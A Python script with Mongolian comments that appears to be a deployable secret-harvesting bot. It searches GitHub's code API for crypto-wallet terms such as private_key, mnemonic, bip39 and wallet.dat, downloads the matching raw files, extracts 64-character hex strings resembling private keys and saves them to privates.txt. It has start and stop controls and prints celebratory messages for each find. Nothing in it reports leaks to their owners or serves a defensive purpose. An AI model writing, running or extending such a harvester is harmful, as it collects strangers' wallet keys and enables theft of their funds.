import requests
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import random
from threading import Thread

# Railway эсвэл Орчны хувьсагчаас GITHUB_TOKEN-ийг унших
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")

if not GITHUB_TOKEN:
    raise ValueError("❌ GITHUB_TOKEN орчны хувьсагч олдсонгүй! Railway Variables хэсэгт тохируулна уу.")
    
headers = {
    "Authorization": f"Bearer {GITHUB_TOKEN}",
    "Accept": "application/vnd.github+json"
}

# Railway volume (/data) байгаа эсэхийг шалгаад result.txt рүү хадгалах
if os.path.exists("/data"):
    RESULT_TXT_PATH = "/data/privates.txt"
else:
    RESULT_TXT_PATH = "privates.txt"

# 👉 Анх асахдаа 100% УНТРААЛТТАЙ байх ёстой
GITHUB_SCANNER_RUNNING = False

def process_single_file(item):
    file_url = item.get("html_url", "")
    repo_name = item.get("repository", {}).get("full_name", "")
    
    raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
    
    try:
        file_res = requests.get(raw_url, headers=headers, timeout=5)
        if file_res.status_code == 200:
            code_content = file_res.text
            
            crypto_keywords = ["private", "hex", "wallet", "crypto", "key", "secret", "mnemonic", "account"]
            if not any(sub in code_content.lower() for sub in crypto_keywords):
                return None

            matches = re.findall(r'\b[a-fA-F0-9]{64}\b', code_content)
            
            if matches:
                found = []
                for match in matches:
                    found.append((match, repo_name, file_url))
                return found
    except Exception:
        pass
    return None

def save_to_file(tokens):
    try:
        existing = set()
        if os.path.exists(RESULT_TXT_PATH):
            with open(RESULT_TXT_PATH, "r", encoding="utf-8") as f:
                for line in f:
                    if "Key:" in line:
                        existing.add(line.split("Key:")[1].strip().lower())
                    elif len(line.strip()) == 64:
                        existing.add(line.strip().lower())

        new_count = 0
        with open(RESULT_TXT_PATH, "a", encoding="utf-8") as f:
            for token in tokens:
                token_clean = token.strip().lower()
                if token_clean not in existing:
                    # Шууд Result формат руу эсвэл цэвэр түлхүүрээр нь бичих
                    f.write(f"{token}\n")
                    existing.add(token_clean)
                    new_count += 1

        if new_count > 0:
            print(f"✅ Шинээр {new_count} ширхэг кодыг {RESULT_TXT_PATH} руу амжилттай хадгаллаа.")
    except OSError as e:
        print(f"Файл хадгалах алдаа: {e}")

def run_github_search():
    global GITHUB_SCANNER_RUNNING
    print("🚀 GITHUB SEARCH THREAD STARTED!")
    
    keywords = [
        "secp256k1", "eth_private_key", "btc_private_key", "wallet_private",
        "ecdsa_private_key", "signing_key", "master_key", "private_key",
        "secret_key", "hex_key", "ethereum_private", "crypto_wallet",
        'mnemonic = "', "bip39", "hdwallet", "wif =", "wallet.dat",
        "keystore.json", "eth.accounts.privateKeyToAccount", "Account.from_key"
    ]
    
    url = "https://api.github.com/search/code"
    
    while GITHUB_SCANNER_RUNNING:
        for keyword in keywords:
            if not GITHUB_SCANNER_RUNNING:
                print("🛑 Scanner зогслоо.")
                break
            print(f"\n🔍 Хайж байна: '{keyword}'...")
            
            for lang in ["python", "javascript", "env", "txt", "typescript", "json"]:
                if not GITHUB_SCANNER_RUNNING:
                    break
                query = f'{keyword} language:{lang}'
                available_pages = list(range(1, 21))
                selected_pages = random.sample(available_pages, 4)
                selected_pages.sort()

                for page in selected_pages:
                    if not GITHUB_SCANNER_RUNNING:
                        break
                    params = {
                        "q": query,
                        "per_page": 100,
                        "page": page
                    }

                    try:
                        sleep_time = random.uniform(2.0, 4.0)
                        time.sleep(sleep_time)

                        response = requests.get(url, headers=headers, params=params, timeout=15)
                        print(f"DEBUG: Status Code: {response.status_code} | Query: {query} | Page: {page}")

                        if response.status_code == 200:
                            items = response.json().get("items", [])
                            if not items:
                                continue
                            
                            found_tokens = set()
                            with ThreadPoolExecutor(max_workers=25) as executor:
                                futures = {executor.submit(process_single_file, item): item for item in items}
                                for future in as_completed(futures):
                                    result = future.result()
                                    if result:
                                        for match, repo_name, file_url in result:
                                            print(f"   🎯 АМЖИЛТТАЙ! Олдлоо -> Repo: {repo_name} | Код: {match}")
                                            found_tokens.add(match)
                            
                            if found_tokens:
                                save_to_file(found_tokens)

                        elif response.status_code == 403:
                            print(f"❌ Rate limit (403): {response.text[:100]}")
                            time.sleep(30)
                        elif response.status_code == 401:
                            print(f"❌ Token буруу (401): {response.text[:100]}")
                            break
                        else:
                            print(f"❌ Алдаа: {response.status_code}")
                            break

                    except requests.RequestException as e:
                        print(f"Сүлжээний алдаа: {e}")
        
        time.sleep(10)

def start_scanner():
    global GITHUB_SCANNER_RUNNING
    if not GITHUB_SCANNER_RUNNING:
        GITHUB_SCANNER_RUNNING = True
        Thread(target=run_github_search, daemon=True).start()
        return True, "🚀 GitHub 64-Key Scanner амжилттай эхэллээ!"
    return False, "⚠️ Scanner аль хэдийн ажиллаж байна."

def stop_scanner():
    global GITHUB_SCANNER_RUNNING
    if GITHUB_SCANNER_RUNNING:
        GITHUB_SCANNER_RUNNING = False
        return True, "🛑 GitHub 64-Key Scanner зогслоо."
    return False, "⚠️ Scanner аль хэдийн зогссон байна."

def clear_tokens():
    try:
        if os.path.exists(RESULT_TXT_PATH):
            with open(RESULT_TXT_PATH, "w", encoding="utf-8") as f:
                f.write("")
            return "🗑️ Бүх олдсон түлхүүрүүдийг амжилттай цэвэрлэлээ."
        return "💡 Цэвэрлэх файл олдсонгүй."
    except Exception as e:
        return f"❌ Алдаа гарлаа: {e}"

def get_tokens_text():
    if os.path.exists(RESULT_TXT_PATH):
        with open(RESULT_TXT_PATH, "r", encoding="utf-8") as f:
            return f.read()
    return "Одоогоор ямар нэгэн GitHub 64-key олдсонгүй (Файл хоосон байна)."
